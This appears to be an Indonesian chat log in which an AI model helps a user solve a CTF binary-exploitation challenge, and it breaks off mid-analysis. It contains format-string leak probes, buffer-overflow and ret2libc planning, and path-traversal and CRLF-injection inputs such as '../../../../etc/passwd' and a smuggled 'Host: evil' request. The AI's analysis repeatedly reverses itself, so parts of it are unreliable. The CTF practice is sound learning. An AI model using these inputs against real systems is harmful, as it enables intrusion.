@@ -1,0 +1,4150 @@
+U-Boot boot log analysis
+Full Protect Pwn
+Bantuan ROP notesvc
+Pwn Tools
+Full Protect Pwn
+aduhh mati aku full protect wokk
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ file chall 
+chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=86847fc98f984e357411d893d8f3b63a6760b6f5, for GNU/Linux 3.2.0, stripped
+                                                                       
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ gdb ./chall                                              
+GNU gdb (Debian 17.2-1+b1) 17.2
+Copyright (C) 2025 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 194 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 9 GDB functions (can be used with print/break). Type help function to see them.                                               
+Reading symbols from ./chall...
+(No debugging symbols found in ./chall)
+------- tip of the day (disable with set show-tips off) -------
+Prefixing a command with ! in GDB will execute it as a shell command, e.g.: !ls or !cat flag.txt
+pwndbg> checksec
+File:     /home/novi4nth/codex/pwn/mighttherightpath/chall
+Arch:     amd64
+RELRO:      Full RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        PIE enabled
+
+Wah, "full protect" tapi ada celah juga! Mari kita analisis:
+
+Checksec hasil:
+
+    ✅ Full RELRO → GOT overwrite tidak bisa
+
+    ❌ No canary found → Ini yang bikin "wokk"! Stack buffer overflow bisa dieksploitasi
+
+    ✅ NX enabled → Tidak bisa execute shellcode di stack
+
+    ✅ PIE enabled → Perlu leak address
+
+Kabar baik: No canary + PIE + NX = kemungkinan besar ret2libc atau ret2plt/ret2csu.
+
+Langkah selanjutnya:
+
+    Cek strings & fungsi menarik:
+
+bash
+
+strings chall | grep -iE "flag|bin/sh|system|cat"
+
+    Cek symbol/PLT (walau stripped, PLT tetap ada):
+
+bash
+
+objdump -d chall | grep -E "@plt>|call.*plt"
+readelf -r chall
+
+    Cari vuln-nya — jalankan di gdb, kasih input gede biar crash, lihat pattern offset:
+
+bash
+
+gdb ./chall
+pwndbg> cyclic 200
+# masukkan ke input program
+pwndbg> cyclic -l <nilai_yang_crash>
+
+    Lihat proteksi tambahan (seccomp?)
+
+bash
+
+seccomp-tools dump ./chall
+# kalau gak ada seccomp-tools:
+strings chall | grep -i seccomp
+
+    Cek apakah ada format string vulnerability — kalau ada printf(user_input) tanpa format specifier, itu jackpot karena bisa leak PIE/libc langsung.
+
+Coba share dulu:
+
+    Hasil strings chall
+
+    Hasil run pertama (apa yang diminta program?)
+
+    Output objdump -d chall | head -100 atau info fungsi di gdb (info functions walau stripped kadang masih ada nama libc)
+
+Dari situ kita bisa tentukan jalur eksploitasi. Kalau No Canary + ada buffer overflow, biasanya tinggal:
+
+    Leak libc (via puts@plt / printf@plt dengan argumen GOT)
+
+    Hitung base libc
+
+    Return ke system("/bin/sh") atau one_gadget
+
+Kirim output lanjutannya, wok! 🔥
+lu berharap apaan ga mungkin segampang itu anjerrr
+
+Wkwkwk santai wok, kita bedah dulu. Ini bukan challenge "flag ada di strings" — ini challenge logic bug, bukan classic ret2libc. Coba lihat indikasinya:
+Analisis dari output lu
+
+Import functions yang mencurigakan:
+
+    socket, connect, getaddrinfo, send, close → Ini network client! Program connect ke suatu server
+
+    getenv dipanggil 3x → Ambil env var (kemungkinan HOST, PORT, atau sejenisnya)
+
+    snprintf + strlen + send → Format request HTTP atau protokol custom
+
+    fgets 2x → Input user
+
+Yang TIDAK ada:
+
+    ❌ Tidak ada system, execve, bin/sh
+
+    ❌ Tidak ada open, read, write (file I/O)
+
+    ✅ Cuma ada send (network)
+
+Ini pola challenge apa?
+
+Kemungkinan besar ini "path" challenge (sesuai nama folder mighttherightpath):
+
+    Program connect ke remote server
+
+    Kirim path/request yang bisa di-inject
+
+    Vulnerability kemungkinan di format string (printf dipanggil dengan user input langsung) atau command injection ke protokol network
+
+Yang harus lu lakuin sekarang
+
+1. Trace flow-nya di gdb — lihat di mana user input dipakai:
+bash
+
+gdb ./chall
+pwndbg> disassemble main
+# atau karena stripped, break di printf/fgets
+pwndbg> b *0x1550   # sekitar printf sebelum fgets
+pwndbg> r
+
+2. Cek env yang dipakai:
+bash
+
+strings chall | grep -E "HOST|PORT|ADDR|=" 
+ltrace ./chall
+
+3. Coba format string dulu — kirim %p.%p.%p.%p ke input, kalau output nampilin hex address, berarti format string bug:
+bash
+
+echo "%p.%p.%p.%p.%p.%p" | ./chall
+
+4. Lihat fungsi di 0x126a dan 0x1537 — ini fungsi yang dipanggil berkali-kali (__cxa_finalize@plt+0x15a dan +0x427), kemungkinan fungsi "cetak menu" dan "logic":
+bash
+
+objdump -d chall --start-address=0x126a --stop-address=0x1400
+objdump -d chall --start-address=0x1537 --stop-address=0x1620
+
+5. Coba jalanin aja:
+bash
+
+./chall
+# lihat dia nanya apa, connect ke mana
+strace -f ./chall 2>&1 | head -50
+
+Dugaanku
+
+Nama folder mighttherightpath + ada socket/send → kemungkinan:
+
+    Ini HTTP client yang kirim request ke server, dan lu bisa path traversal / SSRF / inject HTTP header
+
+    Atau program bikinin path file dari input lu, dikirim ke server, dan server (atau program sendiri) baca flag dari path tertentu
+
+    Atau ada format string yang bocorin stack → bisa overwrite return address ke send/puts buat leak
+
+Share output dari:
+
+    ./chall (jalanin manual, apa yang dia print?)
+
+    strace ./chall
+
+    objdump -d chall --start-address=0x1537 --stop-address=0x1620
+
+    echo "%p.%p.%p" | ./chall
+
+Dari situ ketahuan "path" yang dimaksud di judulnya. Jangan nyerah dulu wok, "no canary" itu udah setengah jalan 🔥
+lu tau kan apa yang ada di otak gw, format string ini mah
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ echo "%p.%p.%p" | ./chall
+====================================================================
+If you can start over life and get an upgrade, what will you choose?
+====================================================================
+Why do you wish to start over? 0x7fd9f7f74963.0x7fd9f7f76760.0x7fd9f7f76760
+
+Input : May your choice not lead to your doom
+
+WKWKWK BENER KAN! Format string! 🔥
+
+Tapi tunggu — itu %p pertama (0x7fd9...963) itu libc address langsung! Dan 2 berikutnya juga libc (kemungkinan stdout/stdin related). Tapi lu cuma dapet 3 karena input cuma 3 specifier.
+
+Yang harus lu lakuin sekarang:
+1. Dump stack buat cari offset yang berguna
+bash
+
+echo "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" | ./chall
+
+Lihat mana yang:
+
+    PIE address (0x55... atau 0x56...) → buat hitung base PIE
+
+    Stack address (0x7ff...) → buat overwrite return address / GOT (tapi Full RELRO, jadi GOT gabisa)
+
+    libc address (0x7f... tanpa ff) → buat hitung libc base
+
+    Nilai yang lu kirim (kalau lu kirim AAAAAAAA, cari 0x4141414141414141) → itu offset lu
+
+2. Cari offset ke return address
+
+Karena No Canary + Full RELRO, jalur paling masuk akal:
+
+    Format string untuk leak libc & stack
+
+    Format string %n untuk arbitrary write → tulis ke return address di stack (bukan GOT, karena RELRO)
+
+    Redirect ke one_gadget atau ROP chain
+
+3. Tapi tunggu — ada twist
+
+Ingat, program ini pake fgets + printf(user_input). Coba cek dulu:
+bash
+
+# Tes apakah input lu ada di stack sebagai controlled value
+echo "AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" | ./chall
+
+Kalau lu liat 0x4141414141414141 di suatu posisi → itu offset lu buat %n.
+4. Kemungkinan besar "right path"-nya
+
+Karena nama folder mighttherightpath dan program nanya "Why do you wish to start over?" — ini kemungkinan:
+
+    Ada logic di mana kalau lu masukin "path" tertentu (via format string atau input kedua), program bakal kasih flag
+
+    Atau format string → overwrite return addr → ROP ke send/connect dengan argumen yang bocorin flag dari server
+
+5. Cek fungsi kedua yang manggil fgets
+bash
+
+objdump -d chall --start-address=0x1537 --stop-address=0x1620
+
+Ada 2x fgets — input pertama (format string), input kedua kemungkinan "choice" yang diproses. Lihat gimana input kedua dipakai.
+Next step konkret
+
+Jalanin ini semua, share outputnya:
+bash
+
+# 1. Full stack dump
+echo "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" | ./chall
+
+# 2. Cek offset ke input kita
+echo "AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" | ./chall
+
+# 3. Disasm fungsi kedua (yang ada fgets ke-2)
+objdump -d chall --start-address=0x1537 --stop-address=0x1620
+
+Dari situ kita tau:
+
+    Offset ke return address
+
+    Libc leak (udah dapet: 0x7fd9f7f74963 — tinggal cari offset-nya di libc lu)
+
+    Target overwrite yang bener
+
+Hint: Kalau lu bisa overwrite return address ke main lagi + leak libc, bisa jadi tinggal one_gadget atau ret2dlresolve. Atau... mungkin ada jalur yang lebih "elegan" — sesuai judul, "might the right path" 😏
+
+Gas, share outputnya!
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ echo "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" | ./chall
+====================================================================
+If you can start over life and get an upgrade, what will you choose?
+====================================================================
+Why do you wish to start over? 0x7fa4b8ff6963.0x7fa4b8ff8760.0x7fa4b8ff8760.(nil).(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa70252e.(nil).(nil).0x7fff58e05490.0x1.0x7fff58e05490.0x55a4be1ff5cd.(nil)
+
+Input : May your choice not lead to your doom
+
+Mantap! Ini analysis-nya:
+Stack Layout dari Format String
+Offset	Nilai	Kemungkinan
+1	0x7fa4b8ff6963	libc leak (return addr / saved ptr)
+2	0x7fa4b8ff8760	libc (_IO_2_1_stdout_?)
+3	0x7fa4b8ff8760	libc sama
+4	(nil)	0
+5	(nil)	0
+6-13	0x70252e70...	INPUT LU! (%p. = 0x70252e pattern)
+14	0xa70252e	sisa input + newline
+15-16	(nil)	0
+17	0x7fff58e05490	stack address
+18	0x1	
+19	0x7fff58e05490	stack
+20	0x55a4be1ff5cd	PIE address!
+21	(nil)	
+Yang penting:
+
+Input lu mulai di offset 6 (posisi arg ke-6 di format string).
+
+Untuk overwrite return address, lu perlu:
+
+    Cari offset ke return address — kirim banyak %p, hitung posisi
+
+    Libc leak: 0x7fa4b8ff6963 — cari offset-nya di libc lokal lu
+
+    PIE leak: 0x55a4be1ff5cd — cari offset di binary
+
+Next step:
+bash
+
+# 1. Cari libc base — cari offset dari 0x...963
+# Di libc lokal, cari symbol yang address-nya berakhiran 963
+# Kemungkinan __libc_start_main+243 atau _IO_file_jumps
+
+# 2. Karena input mulai di offset 6, lu bisa tulis di stack:
+# Format: [addr][padding]%<offset>$n
+
+# 3. Cek dulu apakah bisa overwrite return address
+# Kirim dengan gdb biar keliatan
+gdb ./chall
+pwndbg> b *0x1603  # sebelum return / setelah input kedua
+pwndbg> r
+# input format string
+# input kedua bebas
+# lihat stack
+
+Tapi tunggu — coba dulu liat fungsi kedua
+
+Lu belum share disasm 0x1537. Ada fgets kedua — kemungkinan input kedua ini yang di-printf juga, atau diproses jadi "choice". Cek:
+bash
+
+objdump -d chall --start-address=0x1537 --stop-address=0x1620
+
+Dan coba:
+bash
+
+# Input kedua, tes format string juga
+printf 'AAAA\n%%p.%%p.%%p.%%p.%%p.%%p\n' | ./chall
+
+Kemungkinan jalur "right path"
+
+Karena judulnya "might the right path" dan program nanya "start over" → kemungkinan:
+
+    Format string di input 1 → leak + overwrite return address
+
+    Return ke awal main (loop) atau one_gadget
+
+    Atau ada path/handler tersembunyi yang diakses kalau lu overwrite sesuatu
+
+Share dulu:
+
+    objdump -d chall --start-address=0x1537 --stop-address=0x1620
+
+    printf 'AAAA\n%%p.%%p.%%p.%%p.%%p.%%p.%%p.%%p\n' | ./chall
+
+    Libc version: ldd ./chall → catat versi libc
+
+Gas wok! 🔥
+
+Sekarang jelas banget! Ini classic format string + stack overflow combo. Mari bedah:
+Analisis Fungsi 0x1537 (input pertama)
+asm
+
+1537: push rbp
+1538: mov rbp, rsp
+153b: sub rsp, 0x60          ; buffer 0x60 (96 bytes)
+153f: lea rax, [rip+0xc8a]   ; "Why do you wish to start over? "
+154e: call printf
+155a: lea rax, [rbp-0x60]    ; buffer
+155e: mov esi, 0x60          ; 96 bytes max
+1566: call fgets
+156b: lea rax, [rbp-0x60]
+1577: call printf            ; ← FORMAT STRING BUG!
+1586: call puts
+158c: leave
+158d: ret                    ; ← return address di stack
+
+Kunci: buffer di rbp-0x60, return address di rbp+8. Jarak = 0x68 = 104 bytes ke return address. Tapi fgets cuma 0x60 = 96 bytes, jadi tidak overflow lewat fgets.
+Analisis Fungsi 0x158e (main kedua / input kedua)
+asm
+
+1592: sub rsp, 0x40
+1596: call 1209              ; fungsi sebelumnya (input 1)
+15c8: call 1537              ; ← INI DIA! Panggil fungsi input 1 LAGI
+15e8: lea rax, [rbp-0x40]
+15ec: mov esi, 0x100         ; 256 bytes!
+15f4: call fgets             ; ← BUFFER OVERFLOW DI SINI!
+160d: leave
+160e: ret
+
+JACKPOT! Fungsi kedua (0x158e):
+
+    Buffer di rbp-0x40 (64 bytes)
+
+    fgets(buf, 0x100) → 256 bytes!
+
+    Overflow = 0x40 + 8 = 72 bytes ke return address
+
+Alur program:
+
+    Main manggil 0x1209 (banner + input 1 = format string)
+
+    Main manggil 0x1537 (format string kedua — return addr function 0x1537 ada di stack!)
+
+    Main baca input kedua di rbp-0x40 dengan fgets(0x100) → BOOM, overflow!
+
+Strategi Eksploit:
+
+Fase 1 — Leak:
+
+    Pakai format string di input 1 ATAU 2 buat leak libc + PIE
+
+    Libc leak yang lu dapet: 0x7fa4b8ff6963
+
+Fase 2 — Hitung offset return address:
+
+    Return address fungsi 0x158e ada di stack
+
+    Buffer input kedua di rbp-0x40, return addr di rbp+8
+
+    Offset = 72 bytes
+
+Fase 3 — ROP/ret2libc:
+Karena Full RELRO + PIE + NX, tapi No Canary:
+
+    Overflow return address
+
+    Butuh leak libc dulu (dari format string)
+
+    ROP ke system("/bin/sh") atau one_gadget
+
+TAPI — ada twist lagi
+
+Coba cek: input kedua TIDAK di-printf (setelah fgets langsung puts). Jadi format string cuma di input 1 & 2 (di fungsi 0x1537).
+
+Wait — 0x1537 dipanggil 2x (sekali sebagai input 1, sekali lagi di dalam 0x158e). Jadi lu punya 2 kesempatan format string.
+Next step:
+bash
+
+# 1. Cari offset libc dari leak 0x...963
+# Cek libc:
+ldd ./chall
+# Offset 0x...963 — cari di libc pakai:
+strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -i "..." 
+# atau pakai readelf -s
+
+# 2. Konfirmasi offset overflow dengan gdb
+gdb ./chall
+pwndbg> b *0x160e   # sebelum ret di fungsi 0x158e
+pwndbg> r
+# input 1: bebas
+# input 2 (format string di 0x1537): bebas  
+# input 3 (overflow): cyclic 200
+# cek offset
+
+# 3. Cek libc version
+ldd ./chall
+
+Rencana eksploit final:
+
+    Input 1 (format string di 0x1537): leak libc — tapi lu butuh PIE leak juga buat return ke PLT
+
+    Input 2 (format string lagi di 0x1537): leak PIE atau stack
+
+    Input 3 (buffer overflow di 0x158e): ROP chain
+
+Karena Full RELRO, tidak bisa overwrite GOT. Tapi bisa:
+
+    ret2plt — return ke puts@plt dengan argumen GOT buat leak, lalu return ke main lagi, lalu ROP
+
+    ret2csu — kalau butuh kontrol argumen lebih
+
+    one_gadget — kalau kondisi stack memenuhi
+
+Share:
+
+    ldd ./chall
+
+    readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E "system|__libc_start_main" (sesuaikan path)
+
+    Hasil gdb cyclic buat konfirmasi offset
+
+Gas wok, ini udah 80% kelar! 🔥
+
+WOW, sekarang semua jelas! Ini BUKAN ret2libc — ini HTTP request injection / SSRF via format string! 🤯
+Analisis .rodata — Ini Kuncinya!
+text
+
+2008: "RESULT_HOST"
+2014: "RESULT_PORT"
+2020: "RESULT_KEY"
+
+2030: "POST /internal/result/%s HTTP/1.1\r\n"
+      "Host: unlock-api\r\n"
+      "X-Internal-Key: %s\r\n"
+      "Content-Length: 0\r\n"
+      "Connection: close\r\n\r\n"
+
+20a8: "With this, you can buy anything in the world"
+20d8: "money"
+20e0: "Your result has been updated. Refresh the Result page."
+2118: "With this, you can't possibly die"
+2138: "longevity"
+2148: "With this, you will be able to see through"
+2178: "wise_mind"
+2180: "With this, you will be adored"
+2198: "love"
+21a0: "With this, you will never be hungry"
+21c0: "food"
+
+Program ini:
+
+    Connect ke server (via RESULT_HOST:RESULT_PORT)
+
+    Kirim HTTP POST ke /internal/result/<INPUT> dengan header X-Internal-Key: <RESULT_KEY>
+
+    Input user masuk ke URL path!
+
+Vulnerability Sebenarnya
+
+Format string di input 1 & 2 bisa dipakai buat:
+
+    Leak RESULT_KEY dari environment/stack
+
+    Leak atau overwrite sesuatu
+
+Tapi yang lebih penting — input pertama (yang jadi %s di URL path) bisa inject ke HTTP request!
+"Right Path" = Path Traversal / SSRF!
+
+Lihat: POST /internal/result/%s HTTP/1.1
+
+Kalau lu masukin input yang mengandung \r\n atau ../, lu bisa:
+
+    Path traversal: /internal/result/../../flag → akses endpoint lain
+
+    HTTP request smuggling: inject header/request baru
+
+    SSRF: akses internal endpoint
+
+Tapi tunggu — Format String Juga Penting
+
+RESULT_KEY diambil dari getenv("RESULT_KEY"). Kalo environment variable ini tidak di-set di server, maka getenv return NULL, dan snprintf dengan %s NULL → (null).
+
+Format string dipakai buat leak key kalau key-nya ada di stack/memory!
+Rencana Eksploit
+
+Step 1: Cek environment & koneksi
+bash
+
+env | grep RESULT
+# atau di remote, key-nya di-set
+
+Step 2: Format string leak — cari RESULT_KEY atau flag di memory
+
+Input 1 dan 2 di-printf(user_input) langsung. Lu bisa leak stack, termasuk:
+
+    Libc addresses (udah dapet)
+
+    PIE addresses (udah dapet: 0x55a4be1ff5cd)
+
+    Stack addresses
+
+    String pointers — mungkin ada pointer ke RESULT_KEY atau flag!
+
+Step 3: Path injection
+
+Input pertama yang masuk ke URL path — coba:
+text
+
+../../flag
+../../../../etc/passwd
+../../internal/admin
+
+Atau inject CRLF:
+text
+
+x HTTP/1.1\r\nHost: evil\r\n\r\nGET /flag
+
+Step 4: Stack buffer overflow (input kedua)
+
+Buffer rbp-0x40, fgets(0x100) → overflow 72 bytes ke return address. Tapi karena Full RELRO + PIE, kemungkinan ini bukan jalur utama — mungkin cuma crash atau red herring.
+Yang Harus Dilakukan Sekarang
+bash
+
+# 1. Cek env
+env | grep -i result
+# atau jalankan dengan env yang di-set
+RESULT_HOST=127.0.0.1 RESULT_PORT=8080 RESULT_KEY=test ./chall
+
+# 2. Trace network — lihat request yang dikirim
+strace -f -e trace=network,sendto,sendmsg ./chall 2>&1 | grep -A5 "send"
+
+# 3. Coba path injection di input 1
+echo "../../flag" | ./chall
+echo "x HTTP/1.1
+Host: evil
+
+GET /flag" | ./chall
+
+# 4. Format string buat leak pointer ke string menarik
+echo "%s.%s.%s.%s.%s.%s" | ./chall
+# atau
+echo "%p.%p.%p.%p.%p.%p.%p.%p" | ./chall
+
+Dugaan "Right Path"
+
+Nama challenge "might the right path" + ada POST /internal/result/%s → kemungkinan:
+
+    Path traversal di %s → akses /internal/flag atau endpoint tersembunyi
+
+    Atau format string buat leak RESULT_KEY, lalu kirim request ke endpoint yang butuh key itu
+
+Coba dulu:
+bash
+
+# Test path injection
+printf '../../flag\n' | ./chall
+printf '/internal/../../flag\n' | ./chall
+
+Share:
+
+    env | grep -i result (atau output ./chall full)
+
+    Hasil strace -f -e sendto,sendmsg,connect ./chall
+
+    Coba input ../../../etc/passwd atau ../../flag
+
+Ini udah 95% kelar wok! "Right path" = path traversal! 🔥
+This response is AI-generated, for reference only.
+buffer overflow ga sih, masa iya gabungan ketiganya itu anjir?
+
+Wkwkwk sabar wok, kita luruskan dulu biar gak salah arah. Ini BUKAN buffer overflow — gue sebelumnya salah baca. Mari lihat ulang dengan teliti:
+Koreksi Analisis
+
+Main (0x158e):
+asm
+
+sub rsp, 0x40
+call fcn.00001209      ; banner
+...puts...
+call fcn.00001537      ; ← input 1 (format string)
+printf("Input : ")     ; ← cuma print string, BUKAN user input
+lea rax, [s]           ; buffer di rbp-0x40
+mov esi, 0x100         ; 256
+call fgets             ; ← input 2
+puts("May your choice...")
+leave; ret
+
+Tunggu — printf("Input : ") itu format string TETAP, bukan user input! Jadi:
+
+    Input 1 (di fcn.00001537): fgets(buf, 0x60) → printf(buf) ← FORMAT STRING BUG
+
+    Input 2 (di main): fgets(buf, 0x100) ke rbp-0x40 ← INI YANG OVERFLOW!
+
+Buffer rbp-0x40 = 64 bytes, fgets baca 0x100 = 256 bytes.
+Return address di rbp+8 → offset = 0x40 + 8 = 72 bytes → BUFFER OVERFLOW!
+
+Jadi lu bener — ini GABUNGAN ketiganya:
+
+    Format string (input 1) → leak libc/PIE/stack
+
+    Buffer overflow (input 2) → kontrol return address
+
+    HTTP request injection (via %s di URL path) → jalur "right path"
+
+Tapi tunggu — di mana input 1 dipakai sebagai URL path? Itu di fcn.00001209 (fungsi pertama). Mari cek:
+bash
+
+r2 -q -c 'aaa; s 0x1209; pdf' chall
+
+Alur Lengkap Program
+text
+
+main (0x158e)
+  ├─ fcn.00001209  → banner + HTTP request pakai RESULT_HOST/PORT/KEY
+  │                  (mungkin input user masuk ke URL path di sini?)
+  ├─ fcn.00001537  → FORMAT STRING (input 1, 0x60 bytes)
+  ├─ printf("Input : ")
+  ├─ fgets(buf, 0x100)  → BUFFER OVERFLOW (input 2)
+  └─ puts("May your choice...")
+
+Pertanyaan kritis: input mana yang masuk ke URL path? Kalau input 1 (format string) masuk ke snprintf("POST /internal/result/%s...", input), maka:
+
+    Lu bisa inject CRLF/path traversal di input 1
+
+    Sekaligus format string bug di input 1
+
+Tapi kalau fcn.00001209 gak baca input user (cuma banner + koneksi), berarti input 1 & 2 murni buat format string + overflow.
+Cek fcn.00001209
+bash
+
+r2 -q -c 'aaa; s 0x1209; pdf' chall
+
+Rencana Eksploit (Gabungan)
+
+Fase 1 — Format string (input 1):
+
+    Leak libc (udah: 0x7fa4b8ff6963)
+
+    Leak PIE (udah: 0x55a4be1ff5cd)
+
+    Leak stack
+
+    Cari offset ke return address di stack
+
+Fase 2 — Buffer overflow (input 2):
+
+    Offset 72 bytes ke return address
+
+    ROP chain: karena Full RELRO + PIE, butuh leak dulu
+
+    Target: system("/bin/sh") atau one_gadget
+
+Fase 3 — ret2libc:
+
+    Butuh libc base (dari leak)
+
+    Butuh /bin/sh string (dari libc)
+
+    Return ke system
+
+TAPI — Ingat .rodata!
+
+Ada string menarik:
+
+    RESULT_HOST, RESULT_PORT, RESULT_KEY → environment variable
+
+    POST /internal/result/%s → endpoint
+
+Kemungkinan "right path": Format string dipakai buat leak RESULT_KEY dari environment/stack, lalu... atau overflow dipakai buat ubah alur supaya request dikirim ke path yang bener.
+Next Step Konkret
+bash
+
+# 1. Cek fcn.00001209 — apakah baca input?
+r2 -q -c 'aaa; s 0x1209; pdf' chall
+
+# 2. Konfirmasi offset overflow
+gdb ./chall
+pwndbg> b *0x160e
+pwndbg> r
+# input 1: bebas
+# input 2: cyclic 200
+# lihat RIP
+
+# 3. Cek libc version
+ldd ./chall
+
+# 4. Coba jalankan dengan env
+RESULT_HOST=127.0.0.1 RESULT_PORT=1234 RESULT_KEY=test ./chall
+
+Jawaban lu: Iya, ini gabungan format string + buffer overflow. Format string buat leak, overflow buat eksekusi. "Right path" mungkin metafora buat ROP chain yang bener atau path HTTP yang bener.
+
+Share output fcn.00001209 dan hasil gdb cyclic! 🔥
+ini kan?
+
+Iya, itu fcn.00001209 — cuma setvbuf buat stdin/stdout/stderr. Gak ada input user, gak ada network. Jadi fungsi itu cuma inisialisasi buffer.
+Berarti di mana network & HTTP request-nya?
+
+Yang manggil socket, connect, send, getaddrinfo, snprintf itu di fcn.0000126a (fungsi besar, 457 bytes). Itu yang belum kita bedah!
+bash
+
+r2 -q -c 'aaa; s 0x126a; pdf' chall
+
+Atau langsung:
+bash
+
+objdump -d chall --start-address=0x126a --stop-address=0x1440
+
+Alur sementara yang kita tahu:
+text
+
+main (0x158e)
+  ├─ fcn.00001209  → setvbuf(stdin/out/err)  [cuma init]
+  ├─ puts(banner)
+  ├─ fcn.00001537  → FORMAT STRING (input 1, fgets 0x60) ← VULN 1
+  ├─ printf("Input : ")  [string tetap, aman]
+  ├─ fgets(buf, 0x100)   ← VULN 2 (overflow, buf di rbp-0x40)
+  └─ puts("May your choice...")
+
+Tapi fcn.0000126a kapan dipanggil? Cek XREF:
+bash
+
+r2 -q -c 'aaa; axt @ 0x126a' chall
+
+Kemungkinan fcn.0000126a dipanggil dari fcn.00001537 (input 1) atau dari tempat lain. Kalau fungsi itu yang kirim HTTP request, maka input 1 masuk ke URL path → path injection + format string bug di satu tempat!
+Cek XREF fcn.0000126a
+bash
+
+r2 -q -c 'aaa; axt @ 0x126a' chall
+r2 -q -c 'aaa; s 0x126a; pdf' chall
+
+Yang gue duga:
+
+    fcn.0000126a = fungsi yang baca RESULT_HOST, RESULT_PORT, RESULT_KEY dari env, connect, dan kirim POST /internal/result/%s
+
+    %s itu input user (mungkin input 1)
+
+Kalau bener, "right path" = path injection di URL + format string leak.
+
+Share output pdf @ 0x126a dan axt @ 0x126a wok! 🔥
+
+WKWKWK SEKARANG JELAS SEMUA! Ini BUKAN pwn klasik (ret2libc/ROP). Ini LOGIC CHALLENGE + format string leak. 🤯
+Bedah fcn.0000126a — Fungsi "Kirim HTTP Request"
+c
+
+void send_result(char *user_input) {
+    char *host = getenv("RESULT_HOST");
+    char *port = getenv("RESULT_PORT");
+    char *key  = getenv("RESULT_KEY");
+    
+    // Validasi: ketiganya harus ada & key tidak kosong
+    if (!host || !port || !key || !*key) return;
+    
+    // Resolve & connect ke host:port
+    getaddrinfo(host, port, ...);
+    socket(...);
+    connect(...);
+    
+    // Susun request
+    snprintf(buffer, 0x100,
+        "POST /internal/result/%s HTTP/1.1\r\n"
+        "Host: unlock-api\r\n"
+        "X-Internal-Key: %s\r\n"
+        "Content-Length: 0\r\n"
+        "Connection: close\r\n\r\n",
+        user_input,  // ← arg1 = INPUT USER!
+        key);        // ← RESULT_KEY dari env
+    
+    send(sock, buffer, strlen(buffer), 0);
+    close(sock);
+}
+
+XREF: Fungsi ini dipanggil 5x dari 0x1450, 0x1484, 0x14b8, 0x14ec, 0x1520 — itu di fcn.00001537 yang manggil printf berkali-kali buat nampilin menu "money, longevity, wise_mind, love, food".
+JADI ALURNYA:
+text
+
+fcn.00001537 (input 1 - FORMAT STRING):
+  1. puts("Why do you wish to start over? ")
+  2. fgets(buf, 0x60)
+  3. printf(buf)  ← FORMAT STRING BUG
+  4. puts("With this, you can buy anything...") 
+  5. send_result("money")      ← kirim HTTP
+  6. puts("With this, you can't possibly die")
+  7. send_result("longevity")  ← kirim HTTP
+  8. puts("With this, you will be able to see through")
+  9. send_result("wise_mind")
+  10. puts("With this, you will be adored")
+  11. send_result("love")
+  12. puts("With this, you will never be hungry")
+  13. send_result("food")
+
+send_result dipanggil dengan string KONSTAN, bukan input user! Jadi bukan path injection.
+Lalu di mana "right path"-nya?
+
+Format string di input 1 adalah kuncinya! Lu bisa:
+
+    Leak libc, PIE, stack
+
+    Leak RESULT_KEY dari environment/stack (karena X-Internal-Key: %s pakai key asli)
+
+    Overwrite return address lewat %n?
+
+TAPI — coba pikir lagi. Lu udah punya format string bug. Yang lu butuh cuma:
+
+    /bin/sh — gak ada di binary
+
+    system — gak diimport
+
+Kunci Sebenarnya: "Right Path"
+
+Nama challenge "might the right path". Lihat URL: POST /internal/result/%s. Kalau lu bisa ubah user_input yang dikirim... tapi itu konstanta.
+
+TUNGGU. fcn.00001537 dipanggil 2x:
+
+    Pertama dari main di 0x15c8
+
+    Kedua... cek XREF 0x1537
+
+bash
+
+r2 -q -c 'aaa; axt @ 0x1537' chall
+
+Kemungkinan loop! Kalau fcn.00001537 manggil dirinya sendiri atau dipanggil lagi, dan ada logic di mana send_result dipanggil dengan input user (bukan konstanta)...
+
+Cek fcn.00001537 full! Share:
+bash
+
+r2 -q -c 'aaa; s 0x1537; pdf' chall
+
+Kita udah liat sebagian (yang input format string), tapi belum liat 5x panggilan send_result di 0x1450, 0x1484, 0x14b8, 0x14ec, 0x1520. Itu ada di dalam fcn.00001537 juga! Berarti fungsi itu panjang, dan lu baru liat ujungnya.
+Hipotesis "Right Path":
+
+    Format string di input 1 → leak RESULT_KEY dari env (via %s pointer ke env)
+
+    Atau format string → ubah return address / variabel biar send_result dipanggil dengan input user
+
+    Atau ada choice yang bikin program kirim request ke path /internal/flag instead of /internal/result/
+
+Share full pdf @ 0x1537 biar keliatan 5x panggilan send_result dan gimana input user diproses. Gas wok! 🔥
+nohhh
+
+WKWKWK NAH INI DIA! Sekarang plot twist-nya ketemu!
+Ternyata fcn.00001537 cuma:
+c
+
+void ask_choice() {
+    printf("Why do you wish to start over? ");
